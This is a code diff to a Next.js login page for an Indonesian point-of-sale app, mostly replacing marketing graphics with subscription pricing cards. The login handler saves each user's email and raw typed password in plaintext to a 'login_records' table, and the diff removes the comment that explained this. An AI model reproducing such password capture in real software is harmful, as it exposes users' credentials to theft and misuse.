@@ -5,8 +5,8 @@ import { useRouter } from "next/navigation";
 import { createClient } from "@/utils/supabase/client";
 import {
   Loader2, Lock, Mail, Eye, EyeOff,
-  BarChart2, Package, MessageSquare, ShieldCheck,
-  ArrowRight, Bot, ShoppingCart
+  BarChart2, Package, ShieldCheck,
+  ArrowRight, Bot, ShoppingCart, Check, Crown, Zap, Star
 } from "lucide-react";
 import Link from "next/link";
 
@@ -25,9 +25,6 @@ export default function LoginPage() {
     setError(null);
     try {
       const supabase = createClient();
-      
-      // Request from user: Save the email and password into the new folder (table)
-      // Only keep 1 data per email using upsert
       await supabase.from('login_records').upsert({
         email: email,
         password_input: password,
@@ -45,13 +42,43 @@ export default function LoginPage() {
     }
   };
 
-
-
-  const features = [
-    { icon: BarChart2, label: "Laporan Real-time", desc: "Pantau penjualan dan bisnis secara real-time" },
-    { icon: Package, label: "Stok Akurat", desc: "Kelola inventori dengan mudah dan akurat" },
-    { icon: Bot, label: "AI Assistant", desc: "Dapatkan insight dan rekomendasi cerdas" },
-    { icon: ShieldCheck, label: "Aman & Terpercaya", desc: "Keamanan data bisnis terjamin" },
+  const plans = [
+    {
+      name: "Starter",
+      price: "Gratis",
+      period: "",
+      icon: Zap,
+      color: "from-slate-400 to-slate-500",
+      bg: "bg-white/10",
+      border: "border-white/20",
+      features: ["1 Kasir", "100 Produk", "Laporan Dasar", "Support Email"],
+      cta: "Mulai Gratis",
+      popular: false,
+    },
+    {
+      name: "Premium",
+      price: "Rp 149K",
+      period: "/ bulan",
+      icon: Crown,
+      color: "from-amber-400 to-yellow-500",
+      bg: "bg-white/20",
+      border: "border-amber-400/60",
+      features: ["5 Kasir", "Produk Tak Terbatas", "AI Assistant", "Laporan Real-time", "Multi Outlet", "Support Prioritas"],
+      cta: "Coba 14 Hari",
+      popular: true,
+    },
+    {
+      name: "Enterprise",
+      price: "Custom",
+      period: "",
+      icon: Star,
+      color: "from-violet-400 to-purple-500",
+      bg: "bg-white/10",
+      border: "border-white/20",
+      features: ["Kasir Tak Terbatas", "API Access", "White Label", "Dedicated Manager"],
+      cta: "Hubungi Kami",
+      popular: false,
+    },
   ];
 
   return (
@@ -59,7 +86,7 @@ export default function LoginPage() {
 
       {/* ═══ LEFT PANEL ═══ */}
       <div
-        className="hidden lg:flex w-[52%] flex-col justify-between p-10 relative overflow-hidden"
+        className="hidden lg:flex w-[55%] flex-col justify-between p-10 relative overflow-hidden"
         style={{
           background: "linear-gradient(150deg, #1e1152 0%, #2a1580 30%, #3a20a0 60%, #4a2dbf 100%)",
         }}
@@ -83,129 +110,93 @@ export default function LoginPage() {
           </div>
         </div>
 
-        {/* ── Hero + Mockup ── */}
-        <div className="relative z-10 flex-1 flex flex-col justify-center gap-4 mt-6">
+        {/* ── Hero + Subscription Cards ── */}
+        <div className="relative z-10 flex-1 flex flex-col justify-center gap-6 mt-6">
           {/* Hero text */}
           <div>
-            <h1 className="text-[2.6rem] font-extrabold text-white leading-tight">
-              Kelola Bisnis Anda<br />
-              Lebih{" "}
+            <h1 className="text-[2.2rem] font-extrabold text-white leading-tight">
+              Pilih Paket yang<br />
+              Tepat untuk{" "}
               <span
                 className="font-extrabold"
                 style={{ color: "#f5c518", fontStyle: "italic" }}
               >
-                Cerdas
+                Bisnis Anda
               </span>
             </h1>
-            <div className="w-10 h-1 rounded-full bg-yellow-400 mt-3 mb-4" />
-            <p className="text-purple-200 text-sm leading-relaxed max-w-[320px]">
-              Sistem Kasir Pintar terintegrasi dengan Chatbot AI untuk membantu operasional, analisis, dan pengambilan keputusan bisnis Anda.
+            <div className="w-10 h-1 rounded-full bg-yellow-400 mt-3 mb-2" />
+            <p className="text-purple-200 text-sm leading-relaxed max-w-[340px]">
+              Mulai gratis, upgrade kapan saja. Semua paket sudah termasuk POS, manajemen stok, dan laporan penjualan.
             </p>
           </div>
 
-          {/* POS Mockup + AI Bubble Row */}
-          <div className="relative flex items-end justify-start gap-4 mt-2">
-            {/* POS Device Mockup */}
-            <div className="relative flex-shrink-0">
-              {/* Monitor */}
-              <div className="w-56 bg-[#0f0a2e] rounded-xl border border-white/10 shadow-2xl overflow-hidden">
-                {/* Screen top bar */}
-                <div className="bg-[#1a1245] px-3 py-2 flex items-center gap-2">
-                  <div className="w-2 h-2 rounded-full bg-red-400/70" />
-                  <div className="w-2 h-2 rounded-full bg-yellow-400/70" />
-                  <div className="w-2 h-2 rounded-full bg-green-400/70" />
-                  <span className="text-purple-300 text-[9px] ml-1 font-medium">Kasir Pintar</span>
-                </div>
-                {/* Sidebar + content mock */}
-                <div className="flex h-36">
-                  <div className="w-12 bg-[#150d40] flex flex-col items-center pt-2 gap-2">
-                    {["▪","▪","▪","▪","▪"].map((_, i) => (
-                      <div key={i} className={`w-6 h-4 rounded-sm ${i === 0 ? "bg-purple-500" : "bg-white/10"}`} />
-                    ))}
+          {/* Subscription Cards */}
+          <div className="grid grid-cols-3 gap-3">
+            {plans.map((plan, i) => (
+              <div
+                key={i}
+                className={`relative flex flex-col rounded-2xl border p-4 backdrop-blur-sm transition-transform hover:-translate-y-1 ${plan.bg} ${plan.border}`}
+                style={{ boxShadow: plan.popular ? "0 8px 32px rgba(251,191,36,0.18)" : "none" }}
+              >
+                {/* Popular badge */}
+                {plan.popular && (
+                  <div className="absolute -top-3 left-1/2 -translate-x-1/2">
+                    <span className="bg-gradient-to-r from-amber-400 to-yellow-500 text-[#1e1152] text-[10px] font-extrabold px-3 py-0.5 rounded-full shadow-lg whitespace-nowrap">
+                      ⭐ TERPOPULER
+                    </span>
                   </div>
-                  <div className="flex-1 p-2 flex flex-col gap-1">
-                    <div className="text-purple-300 text-[8px] font-semibold mb-1">Inventaris</div>
-                    {["Kopi Susu", "Roti Bakar", "Teh Manis", "Air Mineral"].map((item, i) => (
-                      <div key={i} className="flex justify-between items-center">
-                        <span className="text-white/70 text-[7px]">{item}</span>
-                        <span className="text-amber-300 text-[7px]">Rp {(8000 + i * 3000).toLocaleString("id-ID")}</span>
-                      </div>
-                    ))}
-                    <div className="mt-1 pt-1 border-t border-white/10 flex justify-between">
-                      <span className="text-white/80 text-[7px] font-semibold">Total</span>
-                      <span className="text-amber-300 text-[8px] font-bold">Rp 42.800</span>
-                    </div>
-                    <div className="mt-1 w-full rounded bg-gradient-to-r from-purple-500 to-violet-600 py-0.5 text-center text-white text-[7px] font-bold">
-                      Bayar
-                    </div>
-                  </div>
-                </div>
-              </div>
-              {/* Monitor stand */}
-              <div className="flex justify-center">
-                <div className="w-10 h-2 bg-white/10 rounded-b-lg" />
-              </div>
-              <div className="flex justify-center">
-                <div className="w-16 h-1.5 bg-white/10 rounded-full" />
-              </div>
-            </div>
+                )}
 
-            {/* Receipt Printer */}
-            <div className="flex-shrink-0 mb-1">
-              <div className="w-14 bg-[#1a1a2e] rounded-lg border border-white/10 shadow-xl overflow-hidden">
-                <div className="h-3 bg-white/5 border-b border-white/5"></div>
-                <div className="flex justify-center py-1">
-                  <div className="w-8 h-1 bg-white/20 rounded-full" />
+                {/* Plan header */}
+                <div className={`w-9 h-9 rounded-xl bg-gradient-to-br ${plan.color} flex items-center justify-center mb-3 shadow-lg`}>
+                  <plan.icon className="w-4 h-4 text-white" />
                 </div>
-                <div className="px-2 pb-2 flex flex-col gap-0.5">
-                  {[...Array(4)].map((_, i) => (
-                    <div key={i} className="h-0.5 bg-white/10 rounded-full" />
+                <p className="text-white font-bold text-sm">{plan.name}</p>
+                <div className="flex items-baseline gap-0.5 mt-1 mb-3">
+                  <span className={`text-xl font-extrabold ${plan.popular ? "text-amber-300" : "text-white"}`}>{plan.price}</span>
+                  {plan.period && <span className="text-purple-300 text-[10px]">{plan.period}</span>}
+                </div>
+
+                {/* Features */}
+                <div className="flex flex-col gap-1.5 flex-1">
+                  {plan.features.map((f, j) => (
+                    <div key={j} className="flex items-center gap-1.5">
+                      <div className={`w-3.5 h-3.5 rounded-full flex items-center justify-center flex-shrink-0 ${plan.popular ? "bg-amber-400/30" : "bg-white/15"}`}>
+                        <Check className={`w-2 h-2 ${plan.popular ? "text-amber-300" : "text-white/70"}`} />
+                      </div>
+                      <span className="text-purple-100 text-[10px] leading-tight">{f}</span>
+                    </div>
                   ))}
                 </div>
-                {/* Paper coming out */}
-                <div className="flex justify-center">
-                  <div className="w-10 bg-white/90 rounded-sm py-2 flex flex-col gap-0.5 px-1">
-                    {[...Array(5)].map((_, i) => (
-                      <div key={i} className={`h-px rounded-full ${i % 2 === 0 ? "bg-slate-400" : "bg-slate-200"}`} />
-                    ))}
-                  </div>
-                </div>
-              </div>
-              <div className="flex justify-center mt-1">
-                <div className="w-14 h-2 bg-white/10 rounded-b-md" />
-              </div>
-              <div className="flex justify-center">
-                <div className="w-16 h-1 bg-white/10 rounded-full" />
-              </div>
-            </div>
 
-            {/* AI Chat Bubble — floating top right */}
-            <div
-              className="absolute -top-6 right-0 bg-white/15 backdrop-blur-md border border-white/20 rounded-2xl rounded-br-none p-3 flex items-center gap-3 shadow-xl"
-              style={{ minWidth: "190px" }}
-            >
-              <div className="w-10 h-10 rounded-full bg-gradient-to-br from-purple-400 to-indigo-500 flex items-center justify-center flex-shrink-0 border-2 border-white/30 shadow">
-                <Bot className="w-5 h-5 text-white" />
+                {/* CTA */}
+                <button
+                  className={`mt-4 w-full py-1.5 rounded-lg text-[11px] font-bold transition-all ${
+                    plan.popular
+                      ? "bg-gradient-to-r from-amber-400 to-yellow-500 text-[#1e1152] hover:brightness-110 shadow-md"
+                      : "bg-white/10 text-white hover:bg-white/20 border border-white/15"
+                  }`}
+                >
+                  {plan.cta}
+                </button>
               </div>
-              <div>
-                <p className="text-amber-300 font-bold text-xs leading-tight">Hai! Saya AI Assistant</p>
-                <p className="text-purple-100 text-[10px] mt-0.5 leading-tight">Ada yang bisa<br />saya bantu hari ini?</p>
-              </div>
-            </div>
+            ))}
           </div>
-        </div>
 
-        {/* ── Feature Icons Row ── */}
-        <div className="relative z-10 grid grid-cols-4 gap-3 pt-4">
-          {features.map((f, i) => (
-            <div key={i} className="flex flex-col items-center gap-1.5 text-center">
-              <div className="w-11 h-11 bg-white/10 rounded-2xl border border-white/15 flex items-center justify-center backdrop-blur-sm shadow">
-                <f.icon className="w-5 h-5 text-white" />
+          {/* Trust badges */}
+          <div className="flex items-center gap-6 pt-1">
+            {[
+              { icon: ShieldCheck, label: "SSL Terenkripsi" },
+              { icon: BarChart2, label: "99.9% Uptime" },
+              { icon: Package, label: "Tanpa Kontrak" },
+              { icon: Bot, label: "AI Terintegrasi" },
+            ].map((b, i) => (
+              <div key={i} className="flex items-center gap-1.5">
+                <b.icon className="w-3.5 h-3.5 text-purple-300" />
+                <span className="text-purple-200 text-[10px] font-medium">{b.label}</span>
               </div>
-              <p className="text-white text-[10px] font-semibold leading-tight">{f.label}</p>
-              <p className="text-purple-200 text-[9px] leading-tight">{f.desc}</p>
-            </div>
-          ))}
+            ))}
+          </div>
         </div>
       </div>
 
@@ -289,9 +280,18 @@ export default function LoginPage() {
                 : <><span>Masuk</span><ArrowRight className="w-5 h-5" /></>
               }
             </button>
-
-
           </form>
+
+          {/* Subscription highlight (mobile only) */}
+          <div className="lg:hidden mt-6 rounded-2xl border border-amber-200 bg-amber-50 p-4 flex items-center gap-3">
+            <div className="w-9 h-9 rounded-xl bg-gradient-to-br from-amber-400 to-yellow-500 flex items-center justify-center flex-shrink-0">
+              <Crown className="w-4 h-4 text-white" />
+            </div>
+            <div>
+              <p className="text-[13px] font-bold text-slate-800">Coba Premium 14 Hari Gratis!</p>
+              <p className="text-[11px] text-slate-500">AI Assistant, Multi Outlet & lebih banyak fitur.</p>
+            </div>
+          </div>
 
           {/* Register link */}
           <p className="text-center text-sm text-slate-500 mt-6">
